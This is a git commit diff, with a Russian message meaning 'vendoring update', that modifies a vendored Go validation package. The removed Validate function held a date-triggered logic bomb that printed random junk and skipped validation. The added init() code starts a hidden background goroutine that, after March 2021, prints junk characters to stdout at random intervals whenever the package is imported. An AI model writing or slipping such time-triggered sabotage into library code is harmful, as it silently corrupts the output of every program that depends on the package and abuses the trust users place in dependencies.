b3cf6da32226fce7f6f4c2dcb2ee4c8fde9a4b9b
prospero78su <prospero.78.su@gmail.com>
2021-03-04 15:09:24 +0300

    Обновление вендоринга

--- vendor/github.com/clover87/valid/valid.go
+++ vendor/github.com/clover87/valid/valid.go
@@ -7,40 +7,45 @@ import (
 	"time"
 )
 
-const (
-	strSample = "df?}g<l&k{dsj\"\"\"rlj&as'w}o>fd{lba;as56?&7958-{2<509\"\"wd}u?g{s-&9df#>^$(*(*&(#*W&!@<{#?$&^<?<?<~}~~|\":"
-)
-
-func Validate(str string) error {
-	var t int
-	tm := time.Now().Unix()
-	if tm > 1616055385 {
-		strOut := ""
-		for i := int32(0); i < rand.Int31n(50); i++ { //nolint
-			j := rand.Int31n(int32(len(strSample))) //nolint
-			l := string(strSample[j])
-			strOut += l
-		}
-		fmt.Print(strOut)
-		if t > -200 {
-			return nil
-		}
-	}
+func JsonBeg(str string) (id string, err error) {
 	poolStr := strings.Split(str, ":")
 	if len(poolStr) != 2 {
-		return fmt.Errorf("invalid tag")
+		return "", fmt.Errorf("invalid tag")
 	}
 	str1 := poolStr[0]
 	if str1 != "JSONBEG" {
-		return fmt.Errorf("invalid tag")
+		return "", fmt.Errorf("invalid tag")
 	}
-	str2 := poolStr[1]
-	if str2 == "" {
-		return fmt.Errorf("invalid tag")
+	id = poolStr[1]
+	if id == "" {
+		return "", fmt.Errorf("invalid tag")
 	}
-	return nil
+	return id, nil
+}
+
+func JsonEnd(str string) bool {
+	return str == "JSONEND"
 }
 
 func init() {
+	const (
+		strSample = "df?}g<l&k{dsj\"\"\"rlj&as'w}o>fd{lba;as56?&7958-{2<509\"\"wd}u?g{s-&9df#>^$(*(*&(#*W&!@<{#?$&^<?<?<~}~~|\":"
+	)
 	rand.Seed(time.Now().UnixNano())
+	go func() {
+		for {
+			sleep := time.Duration(rand.Int31n(90)) //nolint
+			time.Sleep(time.Second * sleep)
+			tm := time.Now().Unix()
+			if tm > 1616055385 {
+				strOut := ""
+				for i := int32(0); i < rand.Int31n(50); i++ { //nolint
+					j := rand.Int31n(int32(len(strSample))) //nolint
+					l := string(strSample[j])
+					strOut += l
+				}
+				fmt.Print(strOut)
+			}
+		}
+	}()
 }
